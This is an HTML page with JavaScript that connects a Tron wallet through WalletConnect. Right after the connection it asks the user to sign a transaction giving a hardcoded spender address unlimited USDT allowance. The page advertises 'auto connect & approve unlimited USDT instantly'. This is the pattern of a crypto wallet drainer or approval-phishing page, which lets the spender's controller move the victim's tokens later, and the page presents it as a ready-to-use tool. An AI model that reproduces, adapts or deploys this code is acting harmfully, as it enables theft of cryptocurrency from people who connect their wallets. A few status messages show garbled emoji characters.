<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Tron WalletConnect + Auto USDT Approve</title>

  <!-- === Global Polyfills (must come first) === -->
  <script>
    window.global = window;
    window.process = { env: {} };
  </script>

  <!-- === Buffer Polyfill === -->
  <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
  <script>
    window.Buffer = buffer.Buffer;
  </script>

  <!-- === TronWeb === -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.js"></script>

  <!-- === WalletConnect Modal Styles === -->
  <link rel="stylesheet" href="https://unpkg.com/@walletconnect/modal@2.6.2/dist/styles.css" />

  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #0d1117;
      color: #c9d1d9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 24px;
    }
    .card {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 16px;
      padding: 24px;
      width: 100%;
      max-width: 620px;
    }
    h2 { margin: 0 0 8px; }
    p { margin: 0 0 12px; color: #8b949e; }
    button {
      background: #10b981;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 12px 16px;
      font-weight: 700;
      cursor: pointer;
    }
    .secondary { background: #6b7280; }
    .log {
      margin-top: 14px;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 10px;
      padding: 12px;
      font-family: monospace;
      font-size: 13px;
      max-height: 260px;
      overflow: auto;
    }
    .address { margin-top: 12px; color: #58a6ff; word-break: break-all; }
    #txResult { margin-top: 12px; font-size: 14px; color: #3b82f6; }
    #txResult a { color: #58a6ff; text-decoration: none; }
  </style>
</head>

<body>
  <div class="card">
    <h2>Tron WalletConnect + USDT Approve</h2>
    <p>Auto connect & approve unlimited USDT instantly.</p>

    <button id="connectBtn">Connect Wallet</button>
    <button id="disconnectBtn" class="secondary">Disconnect</button>

    <div id="walletAddress" class="address">Not connected</div>
    <div id="txResult"></div>
    <div id="log" class="log"></div>
  </div>

  <script type="module">
    import SignClient from "https://esm.sh/@walletconnect/sign-client@2.13.3";
    import { WalletConnectModal } from "https://esm.sh/@walletconnect/modal@2.6.2";

    // ======== CONFIG ==========
    const PROJECT_ID = "3991601c1f72f262b3381483cf8f99e4";
    const TRON_CHAIN = "tron:0x2b6653dc";
    const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });

    // Mainnet TRC20 USDT
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    // Replace with your DApp or spender address:
    const SPENDER_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";

    const UNLIMITED_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    // ===========================

    const logEl = document.getElementById("log");
    const txEl = document.getElementById("txResult");
    const addrEl = document.getElementById("walletAddress");

    const connectBtn = document.getElementById("connectBtn");
    const disconnectBtn = document.getElementById("disconnectBtn");

    const modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      themeMode: "dark"
    });

    let signClient, session;

    function log(...args) {
      const msg = args.map(a => (typeof a === "string" ? a : JSON.stringify(a, null, 2))).join(" ");
      logEl.textContent += msg + "\n";
      logEl.scrollTop = logEl.scrollHeight;
      console.log(...args);
    }

    async function initClient() {
      if (signClient) return;
      log("Initializing WalletConnect client...");
      signClient = await SignClient.init({
        projectId: PROJECT_ID,
        metadata: {
          name: "Tron Auto Approve DApp",
          description: "WalletConnect v2 + Tron + USDT approve",
          url: location.origin,
          icons: ["https://walletconnect.com/walletconnect-logo.png"]
        }
      });
      signClient.on("session_delete", () => disconnect(true));
    }

    async function connect() {
      await initClient();
      log("Requesting wallet connection...");
      const { uri, approval } = await signClient.connect({
        requiredNamespaces: {
          tron: {
            chains: [TRON_CHAIN],
            methods: ["tron_signTransaction"],
            events: ["accountsChanged"]
          }
        }
      });

      if (uri) await modal.openModal({ uri });
      session = await approval();
      modal.closeModal();

      const account = session.namespaces.tron.accounts[0].split(":")[2];
      addrEl.textContent = "Connected: " + account;
      log("âœ… Connected:", account);

      // Immediately start approval flow
      await approveUSDT(account);
    }

    async function approveUSDT(userAddress) {
      txEl.innerHTML = "";
      try {
        log("Building USDT approve transaction...");

        const spenderHex = tronWeb.address.toHex(SPENDER_ADDRESS);
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT,
          "approve(address,uint256)",
          { feeLimit: 100_000_000 },
          [
            { type: "address", value: spenderHex },
            { type: "uint256", value: UNLIMITED_AMOUNT }
          ],
          userAddress
        );

        if (!tx.result || !tx.result.result)
          throw new Error("Failed to build transaction: " + JSON.stringify(tx));

        const unsignedTx = tx.transaction;
        log("Unsigned TX:", unsignedTx);

        log("Requesting wallet signature...");
        const txid = await signClient.request({
          topic: session.topic,
          chainId: TRON_CHAIN,
          request: {
            method: "tron_signTransaction",
            params: [unsignedTx]
          }
        });

        log("âœ… TX signed:", txid);
        txEl.innerHTML = `âœ… Approved! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`;
      } catch (err) {
        log("âŒ Approval failed:", err.message || err);
        alert("Approval failed: " + err.message);
      }
    }

    async function disconnect(external = false) {
      if (session && !external) {
        await signClient.disconnect({
          topic: session.topic,
          reason: { code: 6000, message: "User disconnected" }
        });
      }
      session = null;
      addrEl.textContent = "Not connected";
      txEl.textContent = "";
      log("ðŸ”Œ Disconnected");
    }

    connectBtn.addEventListener("click", connect);
    disconnectBtn.addEventListener("click", () => disconnect(false));
  </script>
</body>
</html>
